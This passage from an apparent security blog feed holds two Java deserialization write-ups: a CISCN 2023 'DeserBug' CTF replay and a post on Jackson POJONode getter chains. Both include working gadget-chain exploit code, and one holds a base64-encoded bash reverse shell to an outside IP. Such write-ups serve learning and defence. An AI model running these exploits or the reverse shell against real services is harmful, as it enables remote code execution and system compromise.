    <summary type="html">&lt;p&gt;之前只是浅浅的知道这个东西，现在来深入学习一下，因为在java题目中有时会用到该方法来进行绕过&lt;/p&gt;
&lt;h1 id=&quot;utf-8编码过程&quot;&gt;&lt;a href=&quot;#UTF-8编码过程&quot; class=&quot;headerlink&quot; title=&quot;UTF-8编码过程&quot;&gt;&lt;/a&gt;UTF-</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2023国赛DeserBug复现</title>
    <link href="https://clowsman.github.io/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-10-15T08:27:33.000Z</published>
    <updated>2024-10-26T08:15:55.801Z</updated>
    
    <content type="html"><![CDATA[<p>虽说题目不是很难，但是由于java题目做的还不是很多不太熟悉，而且java基础不牢，导致一些点让我思考了很久，这里记录一下</p><h1 id="deserbug题目"><a href="#DeserBug题目" class="headerlink" title="DeserBug题目"></a>DeserBug题目</h1><p>jadx反编译源码</p><p><img src="https://cdn.clown2024.cn/202410151633485.png" alt="image-20241015163331429"></p><p>Testapp这里，直接根目录传一个bugstr参数，然后将内容base64解码后反序列化</p><p>Myexpect是一个异常类，没看出有什么特别的地方</p><p>然后题目附件还给了两个包commons-collections-3.2.2.jar，hutool-all-5.8.18.jar</p><p><img src="https://cdn.clown2024.cn/202410151633951.png" alt="image-20241015163239379"></p><p>特意给了一个3.2.2是为什么呢，查了一下commons-collections从3.2.2版本开始尝试序列化或反序列化InvokerTransformer类都会抛出UnsupportedOperationException异常</p><blockquote><p>且该版本在一些危险的Transformer实现类的readObject前加上了FunctorUtils#checkUnsafeSerialization来检测反序列化是否安全。</p></blockquote><p>然后没什么思路了，去看wp当时题目还给了两个提示</p><blockquote><ol><li>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</li><li>jdk8u202(这个本地测试没什么影响)</li></ol></blockquote><p>我就说那个特地写的Myexpect类怎么会没用（</p><p>估计这中间就是给了一段链子的提示不用自己挖</p><p>我们现在就根据提示去看一下他的方法，这里本地工程导入他给的jar包来看</p><p>看到com.app.Myexpect#getAnyexcept</p><p><img src="https://cdn.clown2024.cn/202410151634172.png" alt="image-20241015163448121"></p><p>这里有个newInstance，应该就是最后要执行的地方，就可以用到TemplatesImpl的链子</p><p>emmm Hutool没找出来利用链，打了个cc3试了一下</p><p><img src="https://cdn.clown2024.cn/202410151635530.png" alt="image-20241015163503477"></p><p>InstantiateTransformer这个类也用不了，不会了看wp了</p><p>wp文章：<a href="https://blog.csdn.net/uuzeray/article/details/136748656">https://blog.csdn.net/uuzeray/article/details/136748656</a></p><p>看了之后发现其实是有点合理猜测的思路在里面，并没有完全调试，这也是和java的特性有关</p><p>去看JSONObject</p><p><img src="https://cdn.clown2024.cn/202410151635818.png" alt="image-20241015163529771"></p><p>可以知道他是一个map，他的put方法就相当于是map.put</p><p>那put方法又该怎么样调用呢，我们的lazyMap#get是可以调用put方法的</p><p><img src="https://cdn.clown2024.cn/202410151635507.png" alt="image-20241015163539460"></p><p>如果key不存在他就会调用put方法，令我们的map为JSONObject即可，然后JSONObject因为是map，我们存入的value是object的话，他就会需要获取对象相关属性信息，那怎么获取，应该就是需要通过getter方法，所以就触发了我们的getAnyexcept方法</p><p>所以我们可以走cc5的BadAttributeValueExpException那条链子到lazyMap#get的那部分，然后再拼上JSONObject的那部分链子</p><p>最终链子如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject --&gt; TiedMapEntry#toString --&gt; LazyMap#get --&gt; JSONObject#put --&gt; Myexpect#getAnyexcept --&gt; 触发恶意类<br></code></pre></td></tr></table></figure><h2 id="开始出错"><a href="#开始出错" class="headerlink" title="开始出错"></a>开始出错</h2><p>第一次自己写我是想直接将恶意类放到Myexpect上来触发的，但是他并不行，后来发现是我javassist写错了</p><p>第一次exp(但是远程不通，其实本地也通不了😅)</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> clazz.toClass();<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        setValue(myexpect,<span class="hljs-string">&quot;targetclass&quot;</span>,aClass); <span class="hljs-comment">//设置targetClass为恶意类</span><br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5部分</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;aaa&quot;</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//反射修改val属性</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//生成base64序列化数据</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//一定要记得url编码不然打不通</span><br><br><span class="hljs-comment">//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArray);</span><br><span class="hljs-comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="hljs-comment">//        objectInputStream.readObject();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在就遇上一个非常奇怪的问题了，他现在在序列化的时候会弹计算器，反序列化的时候不会，但是当我在本地把序列化出来的字符串拿出来反序列化的时候他又能弹了再当我去打远程的时候他打不通，只回显一个</p><p><img src="https://cdn.clown2024.cn/202410151636267.png" alt="image-20241015163624227"></p><p>后来又发现上面的的lazyMap也写错了，应该是这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Map lazyMap = LazyMap.decorate(jsonObject, new ConstantTransformer(myexpect));<br></code></pre></td></tr></table></figure><p>因为这样才能保证我们put进去的value是Myexpect类，因为<strong>ConstantTransformer</strong>这个类的transform返回的就是本身（太久没看cc链有点忘了</p><p>但还是通不了，会给我报错ClassNotFound的错误</p><p>我十分地不理解，理论上Myexpect能在反序列化执行newInstance，那我直接执行恶意类的newInstance不就好了，并不需要去再打cc3后面一整个部分，但是他就是不行，我也没找出来问题在哪</p><h2 id="找到原因"><a href="#找到原因" class="headerlink" title="找到原因"></a>找到原因</h2><p>哦cao调了半天，我去看了一下调用栈终于发现问题了</p><p><img src="https://cdn.clown2024.cn/202410151636181.png" alt="image-20241015163634114"></p><p><img src="https://cdn.clown2024.cn/202410151636869.png" alt="image-20241015163641816"></p><p><img src="https://cdn.clown2024.cn/202410151636685.png" alt="image-20241015163650638"></p><p>还是基础不牢的原因啊😭</p><p>下面根据上面的图说一下我自己的理解，对java类加载又清晰了一些</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">首先执行newInstance的话需要走整个类加载的流程<br>然后会先去找全类名<br>因为没有这个类所以在ClassForName途中就会报错<br>而defineClass直接从字节码向jvm注册这个类直接跳过了前面的步骤<br>所以要执行TemplatesImpl的defineClass才行<br></code></pre></td></tr></table></figure><p>下面写一下能通的exp吧，就是封装TrAXFilter来打TemplatesImpl</p><p>exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTA3LjIxMy84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templates &#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5部分</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(myexpect));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//反射修改val属性</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//生成base64序列化数据</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//一定要记得url编码不然打不通</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410151637073.png" alt="image-20241015163705024"></p><p><img src="https://cdn.clown2024.cn/202410151637818.png" alt="image-20241015163713767"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽说题目不是很难，但是由于java题目做的还不是很多不太熟悉，而且java基础不牢，导致一些点让我思考了很久，这里记录一下&lt;/p&gt;
&lt;h1 id=&quot;deserbug题目&quot;&gt;&lt;a href=&quot;#DeserBug题目&quot; class=&quot;headerlink&quot; title=&quot;Des</summary>
      
    
    
    
    <category term="题目复现" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson原生反序列化</title>
    <link href="https://clowsman.github.io/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-12T13:58:39.000Z</published>
    <updated>2024-10-13T16:36:08.900Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章：<a href="https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&u_asig=1a0c381017287414696367848e00f7">https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Jackson的原生反序列化主要是为了触发任意getter方法调用链子，类似fastjson原生反序列化触发getter那样</p><h1 id="getter触发流程"><a href="#getter触发流程" class="headerlink" title="getter触发流程"></a>getter触发流程</h1><p>既然要调用任意getter方法，那我们就要触发getter方法的流程</p><p>Jackson触发getter是在<strong>ObjectMapper#writeValueAsString</strong>方法执行的时候</p><p>打个断点跟踪一下</p><p><img src="https://cdn.clown2024.cn/202410130102864.png" alt="image-20241013010248819"></p><p>这里说几个关键方法</p><p>先走到DefaultSerializerProvider#serializeValue方法</p><p><img src="https://cdn.clown2024.cn/202410130106024.png" alt="image-20241013010627975"></p><p>这里获取一个序列化器，我们传入了POJO对象，所以返回一个BeanSerializer</p><p>然后去到BeanSerializer#serialize方法</p><p><img src="https://cdn.clown2024.cn/202410130110595.png" alt="image-20241013011008553"></p><p>writeStartObject和writeEndObject就是分别在首尾写上’{‘和’}’</p><p>调用getter方法就在serializeFields方法里面</p><p><img src="https://cdn.clown2024.cn/202410130112193.png" alt="image-20241013011227152"></p><p>在serializeAsField方法里面这个地方调用了getter方法</p><p><img src="https://cdn.clown2024.cn/202410130117833.png" alt="image-20241013011745786"></p><h2 id="pojonode"><a href="#POJONode" class="headerlink" title="POJONode"></a>POJONode</h2><p>前面说的都是序列化的getter，和反序列化有什么关系呢，在Jackson的原生反序列化中，利用的是POJONode的toString方法来触发对应类对象的getter方法，我们先来分析一下</p><blockquote><p>这里测得时候发现离谱的地方，测试出来Jackson应该是在2.10.x才把toString去掉改到父类去的，在2.9.x以及之前，POJONode自己本身是有toString方法的，而他的父类BaseJsonNode反而是没有实现toString的，这样就不能进行利用了</p><p><img src="https://cdn.clown2024.cn/202410131258198.png" alt="image-20241013125810157"></p></blockquote><p>他POJONode本身是没有toString的，是到父类BaseJsonNode才有实现，继承关系如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">POJONode --&gt; ValueNode --&gt; BaseJsonNode<br></code></pre></td></tr></table></figure><p>BaseJsonNode#toString</p><p><img src="https://cdn.clown2024.cn/202410130142098.png" alt="image-20241013014250059"></p><p>这里调用了一个InternalNodeMapper.nodeToString方法</p><p><img src="https://cdn.clown2024.cn/202410130143214.png" alt="image-20241013014346177"></p><p>欸是不是看到了一个熟悉的东西，writeValueAsString，这里也就是触发getter方法的地方，也就是漏洞触发点</p><p>所以调用链就是这样的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>能调用getter方法就可以打链子了</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>触发toString自然就选择我们常用的BadAttributeValueExpException了</p><p>链子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject -&gt; POJONode#toString -&gt; BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410131232076.png" alt="image-20241013123218942"></p><p>这是会发现我们在序列化的时候出错了</p><p>根据错误先去看ObjectOuptputStream#writeObject0方法</p><p><img src="https://cdn.clown2024.cn/202410131234990.png" 